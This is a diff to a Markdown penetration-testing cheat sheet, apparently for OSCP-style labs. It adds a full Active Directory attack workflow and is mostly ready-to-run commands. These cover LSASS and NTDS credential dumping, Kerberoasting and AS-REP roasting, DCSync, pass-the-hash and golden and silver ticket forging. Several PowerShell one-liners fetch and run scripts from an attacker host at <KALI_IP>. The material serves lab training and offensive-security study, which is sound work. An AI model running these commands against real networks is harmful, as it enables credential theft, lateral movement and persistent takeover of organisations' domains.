@@ -6,7 +6,6 @@
   - [Nmap Basics](#nmap-basics)
   - [Service Enumeration](#service-enumeration)
     - [SMB](#smb)
-    - [Active Directory](#active-directory)
     - [NFS](#nfs)
     - [FTP](#ftp)
     - [Web/HTTP](#webhttp)
@@ -19,6 +18,13 @@
   - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
   - [Remote Desktop (xfreerdp)](#remote-desktop-xfreerdp)
   - [Meterpreter Session Basics](#meterpreter-session-basics)
+- [Active Directory](#active-directory)
+  - [AD Enumeration](#ad-enumeration)
+  - [Credential Access](#credential-access)
+  - [Lateral Movement](#lateral-movement)
+  - [Privilege Escalation (AD)](#privilege-escalation-ad)
+  - [Persistence](#persistence)
+  - [AD Quick Reference Checklist](#ad-quick-reference-checklist)
 - [Privilege Escalation](#privilege-escalation)
   - [Linux](#linux)
     - [SUID Files](#suid-files)
@@ -237,103 +243,7 @@ nxc smb 10.82.151.31 -d thm.corp -u users.txt -p 'ResetMe123!' --continue-on-suc
 * Useful for password spraying attacks and credential enumeration
 * Can also enumerate shares, sessions, and logged-in users with valid credentials
 
-#### Active Directory
-
-* **SID Enumeration with Impacket** - Enumerates Security Identifiers (SIDs) and users/groups on a Windows domain controller
-
-```bash
-lookupsid.py <domain>/<username>@<target>
-```
-
-* `lookupsid.py`: Impacket tool for SID enumeration via MS-RPC
-* `<domain>/<username>@<target>`: Authentication credentials and target (e.g., `thm.corp/guest@10.82.151.31`)
-* Requires valid domain credentials (often works with guest account or null session)
-* Enumerates domain SID and all users, groups, and aliases in the Active Directory domain
-* Output includes RID (Relative Identifier) and account type (SidTypeUser, SidTypeGroup, SidTypeAlias)
-* Useful for discovering all domain users and groups for further enumeration
-* Can reveal hidden or non-standard user accounts that might not appear in other enumeration methods
-* **Note**: This tool is specific to Active Directory/Windows Domain Controllers
-* Example: `lookupsid.py thm.corp/guest@10.82.151.31`
-
-* **AS-REP Roasting with Impacket** - Attempts to retrieve Kerberos AS-REP tickets for users who don't require pre-authentication
-
-```bash
-GetNPUsers.py <domain>/ -no-pass -usersfile <users.txt> -dc-ip <target>
-```
-
-* `GetNPUsers.py`: Impacket tool for AS-REP Roasting attack
-* `<domain>/`: Domain name (e.g., `thm.corp/`)
-* `-no-pass`: No password flag - uses null session/anonymous authentication
-* `-usersfile <users.txt>`: File containing list of usernames to test (one per line)
-* `-dc-ip <target>`: IP address of the Domain Controller
-* **AS-REP Roasting**: Attacks users with "Do not require Kerberos preauthentication" enabled
-* If a user has this option enabled, retrieves an AS-REP ticket containing an encrypted hash
-* The hash can be cracked offline using tools like `hashcat` or `john` to recover the password
-* **No credentials required** - works with anonymous/null session access
-* Output format: `$krb5asrep$23$username@DOMAIN:hash` (can be cracked with hashcat mode 18200 or john)
-* Example: `GetNPUsers.py thm.corp/ -no-pass -usersfile users.txt -dc-ip 10.82.151.31`
-
-* **Kerberoasting (TGS) — from a domain session** - Any authenticated domain user can request Kerberos **service tickets (TGS)** for accounts that have **SPNs**. The ticket material can be cracked offline to recover the service account password.
-
-* **Enumerate SPNs (Windows, built-in)** — On a domain-joined host:
-
-```cmd
-setspn -T <domain> -Q */*
-```
-
-* `-T <domain>`: DNS-style domain name (e.g. `corp`, `thm.local`)
-* `-Q */*`: Query mode listing registered SPNs (useful for finding roastable accounts)
-
-* **Request hashes with Invoke-Kerberoast (PowerShell)** — Host `Invoke-Kerberoast.ps1` over HTTP on your attacking machine, then run on the target (replace `<KALI_IP>` with your VPN address, e.g. `tun0`):
-
-```powershell
-powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash"
-```
-
-* Output lines start with `$krb5tgs$23$...` — crack with **hashcat mode 13100** (see [Hashcat](#hashcat)).
-* **Contrast with AS-REP roasting**: Kerberoasting needs **some domain credentials / session**; AS-REP roasting targets accounts **without** pre-auth and may work without credentials.
-
-* **Reset User Password and Enable Account (PowerShell)** - Resets a user's password and enables their account in Active Directory
-
-```powershell
-Set-ADAccountPassword -Identity <username> -Reset -NewPassword (ConvertTo-SecureString '<password>' -AsPlainText -Force)
-Set-ADUser -Identity <username> -Enabled $true
-```
-
-* `Set-ADAccountPassword`: PowerShell cmdlet to reset a user's password in Active Directory
-* `-Identity <username>`: Username of the account to modify (e.g., `Darla_Winters`)
-* `-Reset`: Resets the password (forces password change)
-* `-NewPassword (ConvertTo-SecureString ...)`: Sets the new password (must be converted to SecureString)
-* `-AsPlainText -Force`: Allows plaintext password input (required for ConvertTo-SecureString)
-* `Set-ADUser -Identity <username> -Enabled $true`: Enables a disabled user account
-* **Requires**: Domain Admin privileges or Account Operator permissions
-* **Use cases**:
-  * Post-exploitation: After gaining Domain Admin access, reset passwords to maintain persistence
-  * Privilege escalation: Enable disabled accounts or reset passwords of accounts you've compromised
-  * Lateral movement: Reset passwords of other user accounts to expand access
-* **Note**: These commands must be run on a Domain Controller or a machine with RSAT (Remote Server Administration Tools) installed
-* Example: `Set-ADAccountPassword -Identity Darla_Winters -Reset -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)`
-
-* **LDAP Anonymous Enumeration** - Enumerates Active Directory via LDAP using anonymous/null session
-
-```bash
-ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>" > ldapsearch.txt
-```
-
-* `ldapsearch`: Command-line LDAP search utility
-* `-x`: Simple authentication (uses anonymous bind if no credentials provided)
-* `-H ldap://<target>`: LDAP server URI (e.g., `ldap://10.10.161.74`)
-* `-b "dc=<domain>,dc=<tld>"`: Base DN (Distinguished Name) for search (e.g., `"dc=thm,dc=local"`)
-* `> ldapsearch.txt`: Outputs results to a file for analysis
-* **LDAP (Lightweight Directory Access Protocol)**: Primary protocol used by Active Directory for directory queries
-* Enumerates users, groups, computers, organizational units, and other AD objects
-* **Works with anonymous access** when null session/anonymous LDAP binds are allowed
-* Output includes detailed information about all objects in the directory (usernames, groups, descriptions, etc.)
-* Useful for discovering domain structure, user accounts, group memberships, and service accounts
-* **Common base DNs**:
-  * Single domain: `"dc=thm,dc=local"`
-  * Subdomain: `"dc=subdomain,dc=thm,dc=local"`
-* Example: `ldapsearch -x -H ldap://10.10.161.74 -b "dc=thm,dc=local" > ldapsearch.txt`
+* **Active Directory targets** — Full workflow: [Active Directory](#active-directory) (enumeration → credentials → lateral movement → privilege escalation → persistence). Domain password spraying is in the NetExec example above.
 
 #### NFS
 
@@ -568,6 +478,7 @@ evil-winrm -i <target> -u <username> -p '<password>'
   * `cd`, `ls`, `pwd`: Navigate filesystem
   * `Invoke-Binary`: Execute uploaded binaries
 * Example: `evil-winrm -i 10.10.161.74 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'`
+* **Pass-the-Hash** — Use `-H <NT_HASH>` instead of `-p` (see [Pass-the-Hash (PTH)](#pass-the-hash-pth))
 
 ### Remote Desktop (xfreerdp)
 
@@ -615,6 +526,413 @@ certutil -urlcache -f http://<YOUR_IP>/payload.exe payload.exe
 * **Leaving nested shells** - Type `exit` to leave `powershell_shell` or `shell` and return to the `meterpreter >` prompt
 * **Background session** - `background` (or `bg`) sends the session to the background so you can use other Metasploit modules; `sessions -i <id>` to reattach
 * **End the session** - `exit` from the `meterpreter >` prompt closes that Meterpreter session (use `background` first if you only want to step out)
+
+---
+
+## Active Directory
+
+Typical OSCP/lab flow: **Enumeration → Credential Access → Lateral Movement → Privilege Escalation → Persistence**
+
+### AD Enumeration
+
+#### BloodHound / SharpHound
+
+BloodHound maps attack paths in AD from data collected by SharpHound (Windows) or `bloodhound-python` (Linux).
+
+* **Collect on target (Windows, in memory)** — Host `SharpHound.ps1` on your attacking machine:
+
+```powershell
+powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp"
+```
+
+* `-CollectionMethod All`: Sessions, ACLs, trusts, group membership, GPOs
+* Output: `.zip` files — transfer to your attacker box and import into BloodHound
+
+* **Collect from Kali (with domain creds)**:
+
+```bash
+bloodhound-python -u <username> -p '<password>' -d <domain> -ns <DC_IP> -c All
+```
+
+* `-ns <DC_IP>`: Nameserver (Domain Controller IP)
+* `-c All`: All collection methods
+* Output: JSON files for BloodHound import
+
+* **Run BloodHound GUI**:
+
+```bash
+sudo neo4j console &    # DB at http://localhost:7474
+bloodhound &            # GUI — drag .zip or .json into Upload Data
+```
+
+* **Useful pre-built queries** (GUI):
+  * Find all Domain Admins
+  * Find Shortest Paths to Domain Admins
+  * Find Principals with DCSync Rights
+  * Find Computers where Domain Users are Local Admin
+  * **Shortest Paths from Owned Principals** — mark a compromised node as Owned (right-click), then run this query for the path to DA
+
+#### Enum4linux-ng
+
+```bash
+enum4linux-ng -A <target>
+```
+
+* `-A`: All checks (users, shares, groups, password policy, OS info)
+* Modern rewrite of `enum4linux`; reliable on current Windows
+* Useful **before** you have credentials (null session)
+
+#### rpcclient
+
+```bash
+rpcclient -U "" -N <target>
+```
+
+* `-U ""`: Empty username (null session)
+* `-N`: No password
+
+* **Useful commands** (interactive shell):
+
+```text
+enumdomusers          # domain users
+enumdomgroups         # domain groups
+queryuser <RID>       # user details (e.g. queryuser 0x1f4)
+querygroupmem <RID>   # group members
+getdompwinfo          # password policy (check before spraying!)
+netshareenum          # SMB shares
+```
+
+* **One-liner example**:
+
+```bash
+rpcclient -U "guest%" <target> -c "enumdomusers"
+```
+
+#### NetExec (CrackMapExec) — AD
+
+* **Validate credentials** (see also [SMB](#smb)):
+
+```bash
+nxc smb <DC_IP> -d <domain> -u <user> -p '<password>'
+```
+
+* `[+]` = valid creds; `(Pwn3d!)` = local admin on that host
+
+* **Enumerate users, shares, groups**:
+
+```bash
+nxc smb <DC_IP> -d <domain> -u <user> -p '<password>' --users
+nxc smb <target> -d <domain> -u <user> -p '<password>' --shares
+nxc smb <DC_IP> -d <domain> -u <user> -p '<password>' --groups
+```
+
+* **Remote command** (if local admin):
+
+```bash
+nxc smb <target> -d <domain> -u <user> -p '<password>' -x "whoami"
+```
+
+* `-x`: `cmd.exe`; `-X`: PowerShell
+
+#### SID Enumeration (Impacket)
+
+```bash
+lookupsid.py <domain>/<username>@<target>
+```
+
+* Enumerates domain SID, users, groups, and aliases via MS-RPC
+* Often works with `guest` or weak creds
+* Example: `lookupsid.py thm.corp/guest@10.82.151.31`
+
+#### LDAP Enumeration
+
+```bash
+ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>" > ldapsearch.txt
+```
+
+* `-x`: Simple bind (anonymous if allowed)
+* `-b`: Base DN (e.g. `"dc=thm,dc=local"`)
+* Dumps users, groups, computers, OUs when null/anonymous LDAP bind works
+
+---
+
+### Credential Access
+
+#### AS-REP Roasting
+
+Targets accounts with **Do not require Kerberos preauthentication**. No domain creds needed.
+
+```bash
+GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -outputfile asrep_hashes.txt
+```
+
+* Output: `$krb5asrep$23$...` — crack with [Hashcat mode 18200](#hashcat)
+
+#### Kerberoasting
+
+Requires **any valid domain account**. Requests TGS tickets for accounts with SPNs.
+
+* **Linux (Impacket)**:
+
+```bash
+GetUserSPNs.py <domain>/<user>:'<password>' -dc-ip <DC_IP> -outputfile kerberoast_hashes.txt
+```
+
+* **Enumerate SPNs (Windows)**:
+
+```cmd
+setspn -T <domain> -Q */*
+```
+
+* **Windows (Invoke-Kerberoast in memory)**:
+
+```powershell
+powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII hashes.txt"
+```
+
+* Output: `$krb5tgs$23$...` — crack with [Hashcat mode 13100](#hashcat)
+* **vs AS-REP**: Kerberoasting needs creds; AS-REP targets no-preauth accounts without creds
+
+#### Password Spraying
+
+Test **one password** against many users to reduce lockout risk. Check policy first (`rpcclient` → `getdompwinfo`).
+
+```bash
+nxc smb <DC_IP> -d <domain> -u users.txt -p 'Password123!' --continue-on-success | grep "+"
+```
+
+```bash
+kerbrute passwordspray -d <domain> --dc <DC_IP> users.txt 'Password123!'
+```
+
+* `kerbrute` uses Kerberos (often quieter than SMB)
+* Try seasonal passwords (`Season2024!`), company name, `Welcome1`
+
+#### Dump LSASS (Meterpreter)
+
+Requires **SYSTEM** or elevated admin. See [Meterpreter Session Basics](#meterpreter-session-basics).
+
+```text
+load kiwi
+creds_all            # NTLM, Kerberos, cleartext (like sekurlsa::logonpasswords)
+lsa_dump_sam         # local SAM hashes
+lsa_dump_secrets     # LSA secrets (service account passwords)
+```
+
+* If `kiwi` fails, use `hashdump` for local hashes
+* **Offline alternative** — dump then parse on Kali:
+
+```bash
+# On target (Meterpreter shell)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# On Kali
+pypykatz lsa minidump lsass.dmp
+```
+
+#### Dump SAM / NTDS (Impacket)
+
+* **Local SAM** (non-DC):
+
+```bash
+secretsdump.py <domain>/<user>:'<password>'@<target>
+```
+
+* **NTDS.dit on DC** (all domain NTLM hashes — requires DA or DCSync rights):
+
+```bash
+secretsdump.py <domain>/<user>:'<password>'@<DC_IP> -just-dc-ntlm
+```
+
+* `-just-dc-ntlm`: NTLM hashes only (faster)
+* Output format: `user:RID:LM:NT:::`
+
+---
+
+### Lateral Movement
+
+#### Pass-the-Hash (PTH)
+
+Use NTLM hash without the plaintext password. Hash format for Impacket: `LM:NT` — if no LM, use `aad3b435b51404eeaad3b435b51404ee:<NT_HASH>`.
+
+```bash
+psexec.py <domain>/<user>@<target> -hashes :<NT_HASH>
+evil-winrm -i <target> -u <user> -H <NT_HASH>
+smbexec.py <domain>/<user>@<target> -hashes :<NT_HASH>
+nxc smb <target> -d <domain> -u <user> -H <NT_HASH> -x "whoami"
+```
+
+* See [WinRM](#windows-remote-management-winrm) for `evil-winrm` options
+
+#### Pass-the-Ticket (PTT)
+
+Inject a Kerberos ticket (`.ccache`) into the session.
+
+```bash
+getTGT.py <domain>/<user> -hashes :<NT_HASH> -dc-ip <DC_IP>
+export KRB5CCNAME=<user>.ccache
+psexec.py -k -no-pass <domain>/<user>@<target_fqdn>
+```
+
+* `-k`: Use Kerberos (`KRB5CCNAME`)
+* `-no-pass`: No password prompt
+* **Use FQDN**, not IP — Kerberos requires the hostname in the SPN
+
+* **Windows (Rubeus)**:
+
+```cmd
+Rubeus.exe asktgt /user:<user> /rc4:<NT_HASH> /ptt
+klist
+```
+
+#### Overpass-the-Hash
+
+Convert NTLM hash to a Kerberos TGT — useful when raw PTH is blocked (SMB signing, Restricted Admin Mode).
+
+```bash
+getTGT.py <domain>/<user> -hashes :<NT_HASH> -dc-ip <DC_IP>
+export KRB5CCNAME=<user>.ccache
+wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>
+```
+
+#### Remote Execution Tools
+
+| Tool | Port | Notes |
+|------|------|-------|
+| `evil-winrm` | 5985/5986 | Interactive PowerShell; upload/download |
+| `psexec.py` | 445 | Writes service binary (noisy) |
+| `smbexec.py` | 445 | Quieter; no permanent exe |
+| `wmiexec.py` | 135 | Semi-interactive via WMI |
+| `atexec.py` | 445 | Task Scheduler |
+
+```bash
+wmiexec.py <domain>/<user>:'<password>'@<target>
+```
+
+---
+
+### Privilege Escalation (AD)
+
+#### ACL Abuse (GenericAll / WriteDACL)
+
+BloodHound often flags abusable ACLs on users or groups.
+
+* **GenericAll on user** — reset password:
+
+```powershell
+Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)
+Set-ADUser -Identity <target_user> -Enabled $true
+```
+
+* **GenericAll on group** — add yourself:
+
+```powershell
+Add-ADGroupMember -Identity "Domain Admins" -Members <your_user>
+```
+
+* **WriteDACL** — grant yourself DCSync rights (PowerView in memory), then run [DCSync](#dcsync) / `secretsdump.py`
+* Requires RSAT or execution on a DC for `Set-AD*` cmdlets
+
+#### Typical Chain: AS-REP → DCSync
+
+```text
+1. GetNPUsers.py      → AS-REP hash (no preauth)
+2. hashcat -m 18200   → cleartext password
+3. nxc smb            → confirm creds / (Pwn3d!)?
+4. secretsdump.py     → NTDS if DA or DCSync rights
+5. evil-winrm -H      → shell as Administrator
+```
+
+---
+
+### Persistence
+
+#### DCSync
+
+Simulates a DC replication request to pull password hashes from the DC.
+
+```bash
+secretsdump.py <domain>/<DA_user>:'<password>'@<DC_IP> -just-dc-ntlm
+```
+
+* Requires **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All** (or Domain Admin)
+* Output includes **krbtgt** hash → needed for [Golden Ticket](#golden-ticket)
+
+* **Mimikatz (Windows)**:
+
+```cmd
+lsadump::dcsync /domain:<domain> /user:krbtgt
+lsadump::dcsync /domain:<domain> /user:Administrator
+```
+
+#### Golden Ticket
+
+Forge a TGT with the **krbtgt** NTLM hash. Access as any user; survives user password resets.
+
+```bash
+# From secretsdump: krbtgt:502:...:KRBTGT_NTLM_HASH:::
+# Domain SID: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
+
+ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <domain> Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
+```
+
+* **Mimikatz**: `kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt`
+* Default ticket lifetime ~10 years; independent of the user's password
+
+#### Silver Ticket
+
+Forge a TGS for a **specific service** using that service account's NTLM hash. No DC contact during use (quieter than Golden).
+
+```bash
+ticketer.py -nthash <SERVICE_NTLM> -domain-sid <DOMAIN_SID> -domain <domain> \
+  -spn cifs/<fileserver>.<domain> <user_to_impersonate>
+export KRB5CCNAME=<user_to_impersonate>.ccache
+smbclient.py -k -no-pass //<fileserver_fqdn>/share
+```
+
+| | Golden Ticket | Silver Ticket |
+|---|---------------|---------------|
+| Hash needed | krbtgt | Service account |
+| Scope | Entire domain | One service (SPN) |
+| Talks to DC | Yes (on validation) | No |
+| Noise | High | Lower |
+
+---
+
+### AD Quick Reference Checklist
+
+```text
+# ENUMERATION
+enum4linux-ng -A <DC_IP>
+rpcclient -U "" -N <DC_IP> -c "enumdomusers"
+ldapsearch -x -H ldap://<DC_IP> -b "dc=x,dc=y"
+bloodhound-python -u user -p pass -d domain -ns <DC_IP> -c All
+lookupsid.py domain/guest@<DC_IP>
+
+# CREDENTIAL ACCESS (no creds)
+GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
+
+# CREDENTIAL ACCESS (with creds)
+GetUserSPNs.py <domain>/user:pass -dc-ip <DC_IP>
+secretsdump.py <domain>/user:pass@<DC_IP>
+nxc smb <DC_IP> -u users.txt -p 'Pass!' --continue-on-success
+
+# LATERAL MOVEMENT
+evil-winrm -i <target> -u user -H <NT_HASH>
+psexec.py <domain>/user@<target> -hashes :<hash>
+getTGT.py + export KRB5CCNAME + psexec.py -k -no-pass
+
+# PRIVESC / PERSISTENCE
+BloodHound: Shortest Paths to Domain Admins
+secretsdump → krbtgt → ticketer.py (Golden Ticket)
+lsadump::dcsync /user:krbtgt
+
+# ALWAYS CHECK
+whoami /groups
+net group "Domain Admins" /domain
+```
 
 ---
 
@@ -983,7 +1301,7 @@ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-* **Kerberos 5 AS-REP** — Hash lines start with `$krb5asrep$23$...` (see [AS-REP Roasting](#active-directory))
+* **Kerberos 5 AS-REP** — Hash lines start with `$krb5asrep$23$...` (see [AS-REP Roasting](#as-rep-roasting))
 
 ```bash
 hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
